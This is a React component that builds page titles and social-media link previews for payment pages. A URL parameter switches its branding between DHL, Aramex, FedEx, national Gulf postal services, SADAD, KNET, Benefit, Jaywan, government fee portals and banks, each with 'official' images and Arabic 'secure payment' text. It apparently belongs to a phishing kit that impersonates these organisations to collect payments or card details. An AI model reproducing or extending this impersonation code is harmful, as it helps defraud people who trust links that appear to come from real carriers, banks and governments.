import { Helmet } from 'react-helmet-async';
import { getServiceBranding } from '@/lib/serviceLogos';
import { getEntityPaymentShareImage, getEntityIdentity, detectEntityFromURL, getBankOGImage } from '@/lib/dynamicIdentity';
import { isGovernmentService, getGovernmentServiceMeta } from '@/lib/governmentPaymentServices';
import { getCountryByCurrency } from '@/lib/countryCurrencies';

const companyMeta: Record<string, { title: string; description: string; image: string }> = {
  aramex: {
    title: "دفع آمن - أرامكس للشحن السريع 🚚",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅",
    image: "/aramex-hero-official.png"
  },
  dhl: {
    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍",
    image: "/dhl-hero-official.png"
  },
  dhlkw: {
    title: "دفع آمن - DHL الكويت 🇰🇼",
    description: "DHL الكويت - شحن عالمي بسرعة وموثوقية - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة في الكويت والعالم 🌍",
    image: "/dhl-hero-official.png"
  },
  dhlqa: {
    title: "دفع آمن - DHL قطر 🇶🇦",
    description: "DHL قطر - شحن عالمي بسرعة وموثوقية - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة في قطر والعالم 🌍",
    image: "/dhl-hero-official.png"
  },
  dhlom: {
    title: "دفع آمن - DHL عمان 🇴🇲",
    description: "DHL عمان - شحن عالمي بسرعة وموثوقية - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة في عمان والعالم 🌍",
    image: "/dhl-hero-official.png"
  },
  dhlbh: {
    title: "دفع آمن - DHL البحرين 🇧🇭",
    description: "DHL البحرين - شحن عالمي بسرعة وموثوقية - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة في البحرين والعالم 🌍",
    image: "/dhl-hero-official.png"
  },
  fedex: {
    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰",
    image: "/fedex-hero-official.png"
  },
  ups: {
    title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍",
    image: "/ups-hero-official.png"
  },
  smsa: {
    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦",
    image: "/smsa-hero-official.png"
  },
  naqel: {
    title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡",
    image: "/naqel-hero-official.png"
  },
  zajil: {
    title: "دفع آمن - زاجل للشحن السريع 📮",
    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦",
    image: "/zajil-hero-official.png"
  },
  saudipost: {
    title: "دفع آمن - البريد السعودي 🇸🇦",
    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع الأوسع في المملكة 📦",
    image: "/saudipost-hero-official.png"
  },
  empost: {
    title: "دفع آمن - البريد الإماراتي 🇦🇪",
    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن المحلية والدولية الموثوقة ✨",
    image: "/og-empost.jpg"
  },
  qpost: {
    title: "دفع آمن - البريد القطري 🇶🇦",
    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة وآمنة في قطر والعالم 🌍",
    image: "/og-qpost.jpg"
  },
  kwpost: {
    title: "دفع آمن - البريد الكويتي 🇰🇼",
    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل محلية ودولية موثوقة ✅",
    image: "/og-kwpost.jpg"
  },
  omanpost: {
    title: "دفع آمن - البريد العُماني 🇴🇲",
    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل محلية ودولية متميزة 📮",
    image: "/og-omanpost.jpg"
  },
  bahpost: {
    title: "دفع آمن - البريد البحريني 🇧🇭",
    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة وموثوقة في البحرين والعالم ✨",
    image: "/og-bahpost.jpg"
  },
  chalets: {
    title: "دفع آمن - حجز الشاليهات والاستراحات 🏖️",
    description: "حجز شاليهات فاخرة واستراحات مريحة - ادفع بأمان واحجز إقامتك المثالية مع عروض حصرية وخدمات متميزة في جميع أنحاء الخليج 🌟",
    image: "/og-chalets.jpg"
  },
  contracts: {
    title: "دفع آمن - العقود والاتفاقيات القانونية 📄",
    description: "تسديد العقود والاتفاقيات - أكمل دفعتك بأمان للعقود العقارية والتجارية والخدمية مع حماية قانونية كاملة وموثقة ✅",
    image: "/og-contracts.jpg"
  },
  invoices: {
    title: "دفع آمن - الفواتير والمستحقات 📋",
    description: "دفع الفواتير إلكترونياً - سدد فواتيرك ومستحقاتك بكل سهولة وأمان مع تأكيد فوري ومتابعة دقيقة لجميع معاملاتك المالية 💰",
    image: "/og-invoices.jpg"
  },
  government_payment: {
    title: "سداد الخدمات الحكومية - دفع آمن ومضمون 🏛️",
    description: "بوابة الدفع الإلكتروني للخدمات والرسوم الحكومية - سدد رسومك الحكومية بأمان تام عبر سداد، بنفت، كي نت، جيوان ومال | أنظمة الدفع الحكومية المعتمدة في دول الخليج 🇸🇦🇦🇪🇰🇼🇧🇭🇴🇲🇶🇦",
    image: "/og-government_payment.jpg"
  },
  health_links: {
    title: "دفع آمن - الخدمات الصحية والطبية 🏥",
    description: "دفع الخدمات الصحية والطبية - سدد فواتيرك الطبية، التأمين الصحي، والمستشفيات بأمان مع تأكيد فوري وخصوصية تامة 🩺",
    image: "/og-health_links.jpg"
  },
  local_payment: {
    title: "دفع آمن - المدفوعات المحلية 💳",
    description: "خدمات الدفع المحلي السريع - سدد مدفوعاتك المحلية بسهولة وأمان مع دعم جميع وسائل الدفع المحلية المعتمدة في دول الخليج 🌍",
    image: "/og-local_payment.jpg"
  },
  bank_pages: {
    title: "دفع آمن - البنوك الخليجية 🏦",
    description: "الدفع عبر البنوك الخليجية - اختر بنكك المفضل من أكثر من 50 بنك خليجي وأكمل معاملتك المالية بأمان وسرعة فائقة 💎",
    image: "/og-bank_pages.jpg"
  },
  albaraka: {
    title: "دفع آمن - مجموعة البركة 💰",
    description: "مجموعة البركة - خدمات مالية ولوجستية متكاملة - أكمل دفعتك بأمان للحصول على خدمات مصرفية وشحن موثوقة في الخليج ✅",
    image: "/og-albaraka.jpg"
  },
  alfuttaim: {
    title: "دفع آمن - مجموعة الفطيم 📦",
    description: "مجموعة الفطيم - حلول لوجستية متكاملة - أكمل دفعتك بأمان للحصول على خدمات شحن وتوزيع احترافية في المنطقة 🌍",
    image: "/og-alfuttaim.jpg"
  },
  alshaya: {
    title: "دفع آمن - مجموعة الشايع 🏪",
    description: "مجموعة الشايع - خدمات شحن وتوزيع لعلامات تجارية متعددة - أكمل دفعتك بأمان للحصول على خدمات لوجستية متميزة ✅",
    image: "/og-alshaya.jpg"
  },
  bahri: {
    title: "دفع آمن - بحري للشحن البحري 🚢",
    description: "بحري - الشركة الوطنية السعودية للشحن البحري - أكمل دفعتك بأمان للحصول على خدمات شحن بحري ولوجستيات متكاملة 🇸🇦",
    image: "/og-bahri.jpg"
  },
  national: {
    title: "دفع آمن - بحري للشحن البحري 🚢",
    description: "بحري - الشركة الوطنية السعودية للشحن البحري - أكمل دفعتك بأمان للحصول على خدمات شحن بحري ولوجستيات متكاملة 🇸🇦",
    image: "/og-bahri.jpg"
  },
  shipco: {
    title: "دفع آمن - ShipCo للشحن الدولي 🌍",
    description: "ShipCo - خدمات شحن دولي متخصص - أكمل دفعتك بأمان للحصول على خدمات شحن بحري وجوي موثوقة ✅",
    image: "/og-shipco.jpg"
  },
  hellmann: {
    title: "دفع آمن - Hellmann Worldwide Logistics ✈️",
    description: "Hellmann - شبكة دولية للشحن واللوجستيات - أكمل دفعتك بأمان للحصول على خدمات شحن عالمية متكاملة 🌐",
    image: "/og-hellmann.jpg"
  },
  dsv: {
    title: "دفع آمن - DSV Logistics 🚛",
    description: "DSV - حلول شحن ولوجستيات متطورة - أكمل دفعتك بأمان للحصول على خدمات شحن جوي وبحري وبري متكاملة ✅",
    image: "/og-dsv.jpg"
  },
  agility: {
    title: "دفع آمن - Agiliti للوجستيات 📊",
    description: "Agility - خدمات لوجستية وشحن متطورة - أكمل دفعتك بأمان للحصول على حلول سلسلة إمداد واسعة النطاق 🌍",
    image: "/og-agility-temp.jpg"
  },
  genacom: {
    title: "دفع آمن - جيناكم عمان 🏢",
    description: "جيناكم - شركة توصيل عمانية محلية - أكمل دفعتك بأمان للحصول على خدمات توصيل وشحن داخل سلطنة عمان ✅",
    image: "/og-genacom.jpg"
  },
  jinaken: {
    title: "دفع آمن - جيناكن للتوصيل 🚚",
    description: "جيناكن - خدمات توصيل سريعة في عمان - أكمل دفعتك بأمان للحصول على توصيل موثوق وتتبع مباشر 🇴🇲",
    image: "/og-jinaken.jpg"
  },
  jinakum: {
    title: "دفع آمن - جيناكم للتوصيل 💙",
    description: "جيناكم - خدمات توصيل احترافية - أكمل دفعتك بأمان للحصول على خدمات شحن موثوقة في سلطنة عمان ✅",
    image: "/og-jinakum.jpg"
  },
  sadad: {
    title: "سداد - نظام المدفوعات الوطني السعودي 🇸🇦",
    description: "سداد - نظام المدفوعات الوطني السعودي للخدمات الحكومية والفواتير - سداد آمن ومضمون للرسوم الحكومية 🏛️",
    image: "/sadad-hero-premium.png"
  },
  benefit: {
    title: "بنفت - الشبكة الإلكترونية البحرينية 🇧🇭",
    description: "بنفت - الشبكة الإلكترونية البحرينية للمعاملات المالية - دفع آمن للخدمات الحكومية والخاصة 💳",
    image: "/benefit-hero-premium.png"
  },
  knet: {
    title: "كي نت - شبكة الكويت الوطنية للمدفوعات 🇰🇼",
    description: "كي نت - شبكة الكويت الوطنية للمدفوعات الإلكترونية - دفع آمن وسريع للخدمات الحكومية والتجارية ✅",
    image: "/knet-hero-premium.png"
  },
  omannet: {
    title: "عُمان نت - بطاقة مال 🇴🇲",
    description: "عُمان نت - شبكة عُمان للمدفوعات الإلكترونية - بطاقة مال - دفع آمن للخدمات الحكومية والخاصة 💳",
    image: "/maal-hero-premium.png"
  },
  jaywan: {
    title: "جيوان - نظام البطاقة الوطنية الإماراتي 🇦🇪",
    description: "جيوان - نظام البطاقة الوطنية الإماراتي للدفع الإلكتروني - دفع آمن للخدمات الحكومية والخاصة ✅",
    image: "/jaywan-hero-premium.png"
  },
  "qatar-gov": {
    title: "بوابة الدفع الحكومي القطرية 🇶🇦",
    description: "بوابة الدفع الحكومي القطرية - نظام الدفع الإلكتروني للخدمات الحكومية - سداد آمن ومضمون 🏛️",
    image: "/qatar-gov-hero-premium.png"
  },
  default: {
    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية بأمان وسهولة تامة",
    image: "/sadad-hero-premium.png"
  }
};

interface PaymentMetaTagsProps {
  serviceKey: string;
  serviceName: string;
  amount?: string;
  title?: string;
  customDescription?: string;
  description?: string;
}

export const PaymentMetaTags: React.FC<PaymentMetaTagsProps> = ({
  serviceKey,
  serviceName,
  amount,
  title,
  customDescription,
  description,
}) => {
  const branding = getServiceBranding(serviceKey);
  
  const detectedEntity = detectEntityFromURL();
  const entityIdentity = detectedEntity ? getEntityIdentity(detectedEntity) : null;
  const entityShareImage = detectedEntity ? getEntityPaymentShareImage(detectedEntity) : null;
  const entityDescription = entityIdentity?.payment_share_description;
  
  const urlParams = new URLSearchParams(window.location.search);
  const companyParam = urlParams.get('company') || urlParams.get('service') || serviceKey;
  const countryParam = urlParams.get('country') || urlParams.get('c');
  const currencyParam = urlParams.get('currency');
  
  // Check if government service and get appropriate meta
  const isGovService = isGovernmentService(companyParam);
  let govMeta = null;
  
  if (isGovService) {
    // Get country from URL params or infer from currency
    const inferredCountry = currencyParam ? getCountryByCurrency(currencyParam) : null;
    const finalCountry = countryParam || inferredCountry || 'SA';
    govMeta = getGovernmentServiceMeta(finalCountry);
  }
  
  const companyMetaData = isGovService && govMeta 
    ? { title: govMeta.title, description: govMeta.description, image: govMeta.image }
    : (companyMeta[companyParam.toLowerCase()] || companyMeta.default);
  
  let ogImagePath = entityShareImage || companyMetaData.image || branding.ogImage;
  
  if (serviceKey.startsWith('bank_')) {
    const bankId = serviceKey.replace('bank_', '');
    ogImagePath = getBankOGImage(bankId) || companyMeta.bank_pages.image;
  }
  
  const pageTitle = title || companyMetaData.title;
  const pageDescription = description || customDescription || companyMetaData.description || entityDescription || branding.description;
  const ogImage = ogImagePath ? `${window.location.origin}${ogImagePath}` : undefined;
  
  return (
    <Helmet>
      <title>{pageTitle}</title>
      <meta name="description" content={pageDescription} />
      
      <meta property="og:type" content="website" />
      <meta property="og:title" content={pageTitle} />
      <meta property="og:description" content={pageDescription} />
      <meta property="og:url" content={window.location.href} />
      {ogImage && (
        <>
          <meta property="og:image" content={ogImage} />
          <meta property="og:image:secure_url" content={ogImage} />
          <meta property="og:image:width" content="1200" />
          <meta property="og:image:height" content="630" />
          <meta property="og:image:alt" content={serviceName} />
          <meta property="og:image:type" content="image/jpeg" />
        </>
      )}
      
      <meta name="twitter:card" content="summary_large_image" />
      <meta name="twitter:title" content={pageTitle} />
      <meta name="twitter:description" content={pageDescription} />
      {ogImage && <meta name="twitter:image" content={ogImage} />}
      
      <meta name="theme-color" content={entityIdentity?.colors.primary || branding.colors.primary} />
      
      {ogImagePath && <link rel="preload" as="image" href={ogImagePath} />}
      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
      
      <meta name="robots" content="index, follow" />
      <meta name="googlebot" content="index, follow" />
      <link rel="canonical" href={window.location.href} />
    </Helmet>
  );
};

export default PaymentMetaTags;
